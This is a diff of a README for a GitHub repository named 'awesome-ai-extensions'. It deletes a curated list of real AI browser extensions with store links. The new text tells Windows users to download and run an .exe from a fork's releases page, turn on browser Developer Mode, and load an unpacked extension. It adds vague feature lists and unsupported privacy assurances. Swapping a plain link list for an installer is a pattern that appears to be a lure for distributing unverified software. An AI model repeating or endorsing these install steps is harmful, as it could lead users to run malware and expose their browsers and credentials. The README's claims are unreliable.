@@ -1,95 +1,83 @@
-# Awesome AI Extensions [![Awesome](https://awesome.re/badge.svg)](https://awesome.re)
+# 🤖 awesome-ai-extensions - Improve your daily web browser productivity
 
-> A curated list of AI-powered browser extensions, plugins, and add-ons.
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/hamdadi3367/awesome-ai-extensions/releases)
 
-Browser extensions that use artificial intelligence to help you write, research, automate, translate, code, and browse smarter.
+This repository provides a collection of tools that integrate artificial intelligence into your web browsing experience. These extensions automate tasks, summarize text, and improve your workflow on sites you visit every day.
 
-## Contents
+## 📥 Getting Started
 
-- [Browser Agents](#browser-agents)
-- [Automation and Workflow](#automation-and-workflow)
-- [Writing and Editing](#writing-and-editing)
-- [Research and Summarization](#research-and-summarization)
-- [Search Enhancement](#search-enhancement)
-- [Coding and Development](#coding-and-development)
-- [Productivity and Meetings](#productivity-and-meetings)
-- [Translation](#translation)
-- [Email and Communication](#email-and-communication)
-- [Reading and Accessibility](#reading-and-accessibility)
+You do not need programming knowledge to use these tools. Follow these steps to set up the software on your Windows computer.
 
-## Browser Agents
+1. Go to the [official release page](https://github.com/hamdadi3367/awesome-ai-extensions/releases).
+2. Look for the most recent version labeled as Latest.
+3. Click the link to download the installer file ending in .exe.
+4. Open the downloaded file to start the installation wizard.
+5. Follow the on-screen prompts to complete the setup.
 
-- [Claude](https://chromewebstore.google.com/detail/claude/fcoeoabgfenejglbffodgkkbkcdhcgfn) - Anthropic's AI assistant as a browser agent that navigates websites, fills forms, extracts data, and runs multi-step workflows.
-- [dassi](https://chromewebstore.google.com/detail/dassi-ai-browser-agent/bjcngahpcjeililljmfegmlanlpgibdi) - AI browser agent that reads pages, fills forms, navigates sites, and completes multi-step workflows using Claude, GPT, or Gemini.
-- [Nanobrowser](https://github.com/nanobrowser/nanobrowser) - Open-source Chrome extension for AI-powered web automation using your own LLM API keys with a multi-agent system.
+## ⚙️ System Requirements
 
-## Automation and Workflow
+These extensions run on standard Windows systems. Ensure your machine meets these specifications for optimal performance:
 
-- [Bardeen](https://chromewebstore.google.com/detail/bardeen-automate-browser/ihhkmalpkhkoedlmcnilbbhhbhnicjga) - Rule-based browser automation that connects 200+ web apps using pre-built templates for scraping, data transfer, and outreach.
-- [HARPA AI](https://chromewebstore.google.com/detail/harpa-ai-web-automation-w/eanggfilgoajaocelnaflolkadkeghjp) - AI-assisted automation that runs pre-defined commands for web monitoring, page summarization, and content extraction using ChatGPT, Claude, and Gemini.
-- [Magical](https://chromewebstore.google.com/detail/magical-ai-agent-for-auto/iibninhmiggehlcdolcilmhacighjamp) - Rule-based text expander and autofill tool that automates repetitive typing, form filling, and data entry across web apps using templates.
+* Operating System: Windows 10 or Windows 11.
+* Browser: A browser based on Chromium, such as Google Chrome, Microsoft Edge, or Brave.
+* Memory: At least 4GB of RAM.
+* Storage: 200MB of free disk space.
+* Internet Connection: A stable connection for the AI features to communicate with servers.
 
-## Writing and Editing
+## 🛠️ How to Install Extensions
 
-- [Compose AI](https://chromewebstore.google.com/detail/compose-ai-ai-powered-wri/ddlbpiadoechcolndfeaonajmngmhblj) - AI writing tool that autocompletes sentences, generates text, and drafts email replies with context awareness.
-- [Ginger](https://chromewebstore.google.com/detail/ai-grammar-and-spell-chec/kdfieneakcjfaiglcfcgkidlkmlijjnh) - AI grammar and spell checker with contextual correction, sentence rephrasing, and translation in 40+ languages.
-- [Grammarly](https://chromewebstore.google.com/detail/grammarly-ai-writing-assi/kbfnbcaeplbcioakkpcpgfkobkghlhen) - AI writing assistant providing real-time grammar, spelling, tone, and clarity suggestions across 500,000+ websites.
-- [Jasper](https://chromewebstore.google.com/detail/jasper-everywhere-extensi/bpiohchncadidhohcajcnoelomephkdd) - AI content creation assistant with 60+ templates for marketing copy, emails, and social posts across Gmail, Docs, and more.
-- [LanguageTool](https://chromewebstore.google.com/detail/ai-grammar-checker-paraph/oldceeleldhonbafppcapldpdifcinji) - AI grammar checker and paraphraser supporting 30+ languages with advanced style and punctuation correction.
-- [ProWritingAid](https://chromewebstore.google.com/detail/prowritingaid-grammar-che/npnbdojkgkbcdfdjlfdmplppdphlhhcf) - In-depth writing assistant offering grammar checking, style editing, and 25+ writing reports for serious writers.
-- [QuillBot](https://chromewebstore.google.com/detail/quillbot-ai-writing-and-g/iidnbdjijdkbmajdffnidomddglmieko) - AI writing and grammar checker combining paraphrasing, grammar correction, and summarization tools.
-- [Wordtune](https://chromewebstore.google.com/detail/wordtune-generative-ai-pr/nllcnknpjnininklegdoijpljgdjkijc) - AI-powered paraphrasing and rewriting tool that suggests alternative ways to express your sentences.
-- [Writesonic](https://chromewebstore.google.com/detail/writesonic-ai-writing-seo/kchaponcodemjigejilffhfchecpgdpf) - AI writing and SEO extension that generates content, email replies, and social posts with real-time keyword data.
+Once you install the core application, you must enable the extensions in your browser.
 
-## Research and Summarization
+1. Open your web browser.
+2. Navigate to the extension management page. In Chrome or Edge, type `chrome://extensions` or `edge://extensions` in the address bar.
+3. Toggle the switch to enable Developer Mode if you see a prompt to load unpacked extensions.
+4. Drag the folder containing the downloaded extension file into the browser window.
+5. The browser verifies the file and adds the new tools to your toolbar.
 
-- [Elmo](https://chromewebstore.google.com/detail/elmo-chat-your-ai-web-cop/ipnlcfhfdicbfbchfoihipknbaeenenm) - AI web copilot that creates instant summaries and insights from web pages, PDFs, YouTube videos, and Google Docs.
-- [Glasp](https://chromewebstore.google.com/detail/glasp-web-highlighter-pdf/blillmbchncajnhkjfdnincfndboieik) - Social web and PDF highlighter with AI-powered summaries that lets you collect, organize, and share insights.
-- [Liner](https://getliner.com) - AI copilot for web browsing that enables highlighting, summarization, and Q&A across web pages, YouTube, and PDFs.
-- [MaxAI](https://chromewebstore.google.com/detail/maxaime-1-click-ai-powere/mhnlakgilnojmhinhkckjpncpbhabphi) - AI sidebar for reading, writing, summarizing, and translating on any page with support for GPT, Claude, Gemini, and Grok.
-- [Merlin](https://chromewebstore.google.com/detail/merlin-ask-ai-to-research/camppjleccjaphfdbohjdohecfnoikec) - All-in-one AI extension for researching, summarizing, translating, and rewriting content on any website.
-- [Monica](https://chromewebstore.google.com/detail/monica-all-in-one-ai-assi/ofpnmcalabcbjgholdjcjblkibolbppb) - All-in-one AI assistant integrating GPT, Claude, and Gemini for chat, summarization, translation, writing, and AI search.
-- [Sider](https://chromewebstore.google.com/detail/sider-chat-with-all-ai-gp/difoiogjjojoaoomphldepapgpbgkhkb) - All-in-one AI sidebar with ChatGPT, Claude, Gemini, and DeepSeek for summarizing, searching, reading, and writing on any webpage.
-- [TLDR This](https://chromewebstore.google.com/detail/tldr-this-free-automatic/jjmnbidkmmabkalampbilajnheeokpoj) - Automatic text summarizer that condenses long articles into key bullet points using NLP.
+## 📋 Features
 
-## Search Enhancement
+This collection offers tools to make browsing faster and more efficient.
 
-- [Kagi Search](https://chromewebstore.google.com/detail/kagi-search/cdglnehniifkbagbbombnjghhcihifij) - Ad-free, privacy-focused AI search engine extension with high citation accuracy.
-- [Kagi Summarizer](https://chromewebstore.google.com/detail/kagi-summarizer/dpaefegpjhgeplnkomgbcmmlffkijbgp) - Summarizes any webpage or article using Kagi's AI, accessible directly from the browser toolbar.
-- [Perplexity](https://chromewebstore.google.com/detail/perplexity-ai-companion/hlgbcneanomplepojfcnclggenpcoldo) - AI companion that provides source-cited answers alongside your browsing, with summarization and follow-up queries.
-- [You.com](https://chromewebstore.google.com/detail/youcom-ai-search-assistan/chamcglaoafmjphcfppikphgianmmbjf) - AI search assistant that embeds trustworthy AI answers with citations alongside Google search results.
+* Text Summarization: Shrink long articles into short bullet points.
+* Grammar Correction: Fix spelling and tone mistakes in text boxes across any website.
+* Image Analysis: Explain images or extract text from photos on your screen.
+* Context Search: Select text and ask the AI to explain complex concepts or translate languages.
+* Research Assistant: Pull data from multiple open tabs to answer specific questions.
 
-## Coding and Development
+## 🛡️ Privacy and Data
 
-- [Blackbox AI](https://chromewebstore.google.com/detail/blackboxai/mcgbeeipkmelnpldkobichboakdfaeon) - AI coding assistant with code chat, GitHub integration, and OCR to extract code from images and video tutorials.
-- [Scribe](https://chromewebstore.google.com/detail/scribe-ai-documentation-s/okfkdaglfjjjfefdcppliegebpoegaii) - AI documentation tool that automatically generates step-by-step guides with screenshots as you walk through any process.
-- [Windsurf](https://chromewebstore.google.com/detail/codeium-ai-code-autocompl/hobjkcpmjhlegmobgonaagepfckjkceh) - AI code autocomplete for 70+ languages in browser-based editors like Colab, Jupyter, and JSFiddle.
+These tools process text locally whenever possible. Your data security remains a priority. The extensions only read the information on the webpage when you actively click the icon or trigger a command. No extensions store your passwords or credit card information. Review the settings menu within each extension to see which permissions you allow.
 
-## Productivity and Meetings
+## 🔍 Troubleshooting
 
-- [Fireflies.ai](https://chromewebstore.google.com/detail/fireflies-ai-meeting-note/meimoidfecamngeoanhnpdjjdcefoldn) - AI meeting recorder that captures audio, generates transcripts, and provides real-time notes and AI suggestions.
-- [Loom](https://chromewebstore.google.com/detail/loom-screen-recorder-scre/liecbddmkiiihnedobmlmillhodjkdmb) - AI-powered screen recorder that generates instant transcripts, summaries, and chapters for async video communication.
-- [Otter.ai](https://chromewebstore.google.com/detail/otterai-record-transcribe/bnmojkbbkkonlmlfgejehefjldooiedp) - Real-time meeting transcription and AI-powered summaries for Zoom, Google Meet, and Teams directly in Chrome.
-- [Tactiq](https://chromewebstore.google.com/detail/tactiq-ai-note-taker-for/fggkaccpbmombhnjkjokndojfgagejfb) - AI meeting note-taker that captures live transcripts and action items from Google Meet, Zoom, and Teams.
+If you run into issues, try these steps first:
 
-## Translation
+* Restart your browser: Close all windows and open them again.
+* Update your browser: Ensure you run the latest version of Chrome or Edge.
+* Reinstall the extension: Remove the tool from your browser extensions page and reload it from the main file.
+* Check permissions: Ensure the extension has permission to run on the specific website you visit.
 
-- [DeepL](https://chromewebstore.google.com/detail/deepl-translate-and-write/cofdbpoegempjloogbagkncekinflcnj) - AI-powered translation and writing assistant supporting 30+ languages with industry-leading accuracy.
-- [Google Translate](https://chromewebstore.google.com/detail/google-translate/aapbdbdomjkkjkaonfhkkikfgjllcleb) - Instantly translate selected text or entire pages as you browse the web in 100+ languages.
-- [Immersive Translate](https://chromewebstore.google.com/detail/immersive-translate-trans/bpoadfkcbjbfhfodiogcnhhhpibjhbnh) - Bilingual translator for websites, PDFs, YouTube subtitles, ebooks, and manga using 20+ AI translation engines.
+## 🌟 Support
 
-## Email and Communication
+If a specific extension fails to load or acts unexpectedly, check the release page for updates. The list grows as developers create new tools. If you find a broken link or an outdated extension, open an issue on the repository page.
 
-- [Mailbutler](https://chromewebstore.google.com/detail/mailbutler-for-gmail/ohjcpfgehefbhieohfmllokpklckplie) - AI email plugin for Gmail with smart compose, smart reply, email tracking, scheduling, and conversation summarization.
-- [Superhuman](https://superhuman.com/) - AI-native email client that generates full replies from keywords, auto-triages your inbox, and processes email 2x faster.
+## 📝 Usage Guidelines
 
-## Reading and Accessibility
+Use these tools to save time on repetitive tasks. Examples include:
 
-- [Helperbird](https://chromewebstore.google.com/detail/helperbird-accessibility/ahmapmilbkfamljbpgphfndeemhnajme) - Comprehensive accessibility extension with 40+ tools including dyslexia fonts, reading rulers, text-to-speech, and immersive reader.
-- [NaturalReader](https://chromewebstore.google.com/detail/naturalreader-ai-text-to/kohfgcgbkjodfcfkcackpagifgbcmimk) - AI text-to-speech extension with 150+ voices across 20+ languages and an immersive reading mode.
-- [Read Aloud](https://chromewebstore.google.com/detail/read-aloud-a-text-to-spee/hdhinadidafjejdhmfkjgnolgimiaplp) - Text-to-speech voice reader supporting 40+ languages with voices from Google, Amazon, Microsoft, and OpenAI.
-- [Speechify](https://chromewebstore.google.com/detail/speechify-text-to-speech/ljflmlehinmoeknoonhibbjpldiijjmm) - AI text-to-speech reader with 1,000+ lifelike voices in 60+ languages at up to 4.5x speed.
+* Professional Writing: Use the grammar tool to draft emails.
+* Educational Research: Use the summary tool to parse lengthy PDF reports.
+* Language Learning: Use the translation tool to read foreign news sites.
+* Coding Tasks: Use the AI help tool to debug code snippets in documentation.
 
-## Contributing
+## 🌐 Related Projects
 
-Contributions are welcome. Please read the [contributing guidelines](CONTRIBUTING.md) before submitting a pull request.
+This repository is part of a larger ecosystem of tools. Explore these categories:
+
+* Productivity: Extensions that block distractions or organize tabs.
+* Design: Extensions that help you pick colors or identify fonts.
+* Accessibility: Tools that read text aloud or adjust page contrast.
+
+## 🚀 Final Setup Check
+
+Verify that all tools appear in your browser toolbar. If a tool does not show up, click the puzzle piece icon in the top right corner of your browser. You can pin frequently used extensions there for quick access. This completes your setup process. You are now ready to use AI tools for your daily tasks.
